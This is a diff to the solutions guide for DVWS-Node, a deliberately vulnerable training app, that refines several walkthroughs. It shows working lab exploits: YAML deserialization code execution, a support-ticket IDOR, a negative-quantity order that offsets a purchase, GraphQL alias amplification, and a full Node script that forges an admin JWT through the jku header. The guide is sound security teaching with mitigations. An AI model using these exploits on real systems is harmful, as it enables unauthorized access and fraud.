@@ -70,8 +70,8 @@ This guide walks through the deliberately vulnerable parts of DVWS-Node. It give
 50. [Excessive Activity Report Page Size](#50-excessive-activity-report-page-size)
 51. [Missing Security Headers](#51-missing-security-headers)
 52. [GraphQL Alias Amplification](#52-graphql-alias-amplification)
-53. [Predictable UUID Support Ticket IDOR](#53-predictable-uuid-support-ticket-idor)
-54. [Resource Store: Get an Item for Free](#54-resource-store-get-an-item-for-free)
+53. [Support Ticket IDOR via Exposed UUID](#53-support-ticket-idor-via-exposed-uuid)
+54. [Resource Store: Offset a Purchase with a Negative Order](#54-resource-store-offset-a-purchase-with-a-negative-order)
 55. [Resource Store: Increase Your Balance by 1,000 Credits](#55-resource-store-increase-your-balance-by-1000-credits)
 56. [JWT JKU Key Source Trust](#56-jwt-jku-key-source-trust)
 57. [JWT KID Path Traversal](#57-jwt-kid-path-traversal)
@@ -1540,11 +1540,11 @@ The response is `Hello 49`. The parameter is inserted into a newly compiled func
 
 **Endpoint:** `POST /api/v2/integrations/supplier-orders/import`
 
-**Scenario:** A retailer accepts YAML order batches from a supplier integration. The importer supports an optional post-import hook, and its YAML schema permits executable function tags.
+**Scenario:** A retailer accepts YAML order batches from a supplier integration. The importer supports an optional hook named `postImport`, and its YAML schema permits executable function tags. Despite its name, the hook runs before the validated orders are saved.
 
 ### Challenge
 
-Upload a normal supplier order batch, then show that a tagged post-import hook executes during the import. Keep the demonstration local and use only the provided marker-file proof.
+Upload a normal supplier order batch, then show that the tagged hook executes during the import. Keep the demonstration local and use only the provided marker-file proof.
 
 ### Solution
 
@@ -1568,7 +1568,13 @@ curl -X POST http://dvws.local/api/v2/integrations/supplier-orders/import \
   -F 'file=@orders.yaml;type=text/yaml'
 ```
 
-The response reports one imported order with its item details. The order is persisted under the authenticated account and appears in `GET /api/v2/resource-store` order history. `/tmp/dvws-yaml-import-marker` contains `executed`, proving that the function tag was deserialized and invoked during the same import.
+The response reports one imported order with its item details. The order is persisted under the authenticated account and appears in `GET /api/v2/resource-store` recent orders. The marker path is inside the web container. With the Compose setup, check it from the checkout directory:
+
+```sh
+docker compose exec -T web cat /tmp/dvws-yaml-import-marker
+```
+
+The output is `executed`, proving that the function tag was deserialized and invoked during the same import. The hook runs before the order is persisted; its name does not describe the actual execution order.
 
 The example is non-destructive, but the vulnerable parser can execute arbitrary JavaScript; the marker path does not sandbox it. Run this challenge only in an isolated lab.
 
@@ -1747,7 +1753,7 @@ Neither response sets `X-Frame-Options`, `Content-Security-Policy`, or `X-Conten
 
 ### Challenge
 
-Use one GraphQL operation to make several backend lookups, then observe that one HTTP request can invoke the resolver many times.
+Use one GraphQL operation to request several username lookups. Compare the separate alias results, then inspect the resolver to see why each alias causes a database lookup.
 
 ### Solution
 
@@ -1760,19 +1766,19 @@ Use one GraphQL operation to make several backend lookups, then observe that one
 }
 ```
 
-Send this as the `query` field in a JSON `POST /graphql` request. The response includes a result for each alias. Add more uniquely named aliases to increase the number of resolver executions while still using a single HTTP request.
+Send this as the `query` field in a JSON `POST /graphql` request. The response contains separate `first`, `second`, `third`, and `fourth` fields. The response alone does not count database queries: inspect `userSearchByUsername` in `src/graphql/schema.js`, which calls `User.find` each time the field is resolved. Add more uniquely named aliases to repeat that resolver within one HTTP request.
 
 **Mitigation:** Apply query complexity and depth limits, cap aliases or resolver calls per operation, and set request time and resource budgets.
 
-## 53. Predictable UUID Support Ticket IDOR
+## 53. Support Ticket IDOR via Exposed UUID
 
 **Endpoints:** `POST /api/v2/support/tickets`, `GET /api/v2/support/tickets/:id`
 
-**Scenario:** Support tickets use UUIDv1 identifiers. The notification inbox includes the ID of a ticket owned by the seeded `recovery-victim` account. UUIDv1 encodes a timestamp and may allow nearby IDs to be narrowed down when an attacker knows a ticket was created around the same time. This is a useful clue, not a guarantee that arbitrary UUIDv1 values can be predicted. The authenticated read endpoint checks that a ticket exists but omits an ownership check.
+**Scenario:** Support tickets use UUIDv1 identifiers. The notification inbox exposes the ID of a ticket owned by the seeded `recovery-victim` account. The authenticated read endpoint checks that a ticket exists but omits an ownership check. UUIDv1 includes a timestamp, but this exercise obtains the victim's exact ID from the notification rather than predicting it.
 
 ### Challenge
 
-Sign in as `test` (`test` / `test`) and inspect the notification inbox for a ticket UUID. Create a ticket and inspect its UUID format and timestamp. Then request the notified ticket using its UUID, and compare the result with a malformed UUID and a valid but unknown UUID.
+Sign in as `test` (`test` / `test`) and inspect the notification inbox for a ticket UUID. Optionally create your own ticket to inspect its UUIDv1 format; its current timestamp will not help derive the older seeded ticket's ID. Request the notified ticket using its UUID, and compare the result with a malformed UUID and a valid but unknown UUID. To create your own ticket:
 
 ```sh
 curl -X POST http://dvws.local/api/v2/support/tickets \
@@ -1803,7 +1809,7 @@ The response contains the seeded `recovery-victim` ticket even though the caller
 
 ---
 
-## 54. Resource Store: Get an Item for Free
+## 54. Resource Store: Offset a Purchase with a Negative Order
 
 **Endpoints:** `GET /api/v2/resource-store`, `POST /api/v2/resource-store/orders`
 
@@ -1822,7 +1828,7 @@ Content-Type: application/json
 {"itemId":"api-monitor","quantity":-1}
 ```
 
-The order response shows the 10 credits returned, restoring the balance to 100. The negative quantity and positive credit change also appear in **Recent orders**, completing the free item challenge.
+The order response shows a 10-credit increase, restoring the balance to 100. **Recent orders** shows both the original purchase and the negative-quantity order. This proves that an order can be offset in the wallet ledger. The lab does not provision an API Monitor service or track item ownership, so it cannot show that a service was obtained for free.
 
 **Mitigation:** Validate quantity as a positive integer at the server boundary, derive prices from trusted catalogue data, and enforce balance constraints in the same atomic transaction as order creation.
 
@@ -1830,7 +1836,7 @@ The order response shows the 10 credits returned, restoring the balance to 100. 
 
 **Endpoints:** `GET /api/v2/resource-store`, `POST /api/v2/resource-store/orders`
 
-**Prerequisite:** Complete [Challenge 54](#54-resource-store-get-an-item-for-free).
+**Prerequisite:** Complete [Challenge 54](#54-resource-store-offset-a-purchase-with-a-negative-order).
 
 ### Challenge
 
@@ -1865,6 +1871,46 @@ curl http://dvws.local/api/v2/admin/logs \
 ```
 
 The shared middleware fetches the attacker's JWK set, verifies the token with that key, and returns the application's protected login logs.
+
+For a self-contained demonstration with the Compose setup, run this from the checkout directory. It starts a temporary JWK server inside the web container, signs a token with the corresponding private key, compares the protected route without and with that token, and shuts down the JWK server. `127.0.0.1` works for the `jku` URL here because both the temporary server and DVWS run inside the same container.
+
+```sh
+docker compose exec -T web node <<'NODE'
+const crypto = require('crypto');
+const http = require('http');
+const jwt = require('jsonwebtoken');
+
+(async () => {
+  const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
+  const jwk = { ...publicKey.export({ format: 'jwk' }), kid: 'local-demo', use: 'sig', alg: 'RS256' };
+  const jwksServer = http.createServer((_req, res) => {
+    res.setHeader('Content-Type', 'application/json');
+    res.end(JSON.stringify({ keys: [jwk] }));
+  });
+  await new Promise((resolve) => jwksServer.listen(0, '127.0.0.1', resolve));
+
+  try {
+    const jku = `http://127.0.0.1:${jwksServer.address().port}/jwks`;
+    const token = jwt.sign({ user: 'admin', permissions: ['user:admin'] }, privateKey, {
+      algorithm: 'RS256',
+      issuer: 'https://github.com/snoopysecurity',
+      header: { jku, kid: jwk.kid }
+    });
+    const endpoint = 'http://127.0.0.1/api/v2/admin/logs';
+    const withoutToken = await fetch(endpoint);
+    const withToken = await fetch(endpoint, { headers: { Authorization: `Bearer ${token}` } });
+    console.log(`Without token: ${withoutToken.status}; forged token: ${withToken.status}`);
+    if (withoutToken.status !== 401 || withToken.status !== 200) {
+      throw new Error('Expected HTTP 401 without a token and HTTP 200 with the forged token');
+    }
+  } finally {
+    await new Promise((resolve) => jwksServer.close(resolve));
+  }
+})().catch((error) => { console.error(error); process.exitCode = 1; });
+NODE
+```
+
+The expected output is `Without token: 401; forged token: 200`.
 
 **Mitigation:** Bind each issuer to a server-configured key set or pinned keys. Do not let an untrusted token choose the key source; validate `iss`, `aud`, allowed algorithms, and key ID against trusted configuration. The fetch has a timeout and response-size limit, but trust in the token-selected key source remains intentionally vulnerable.
 
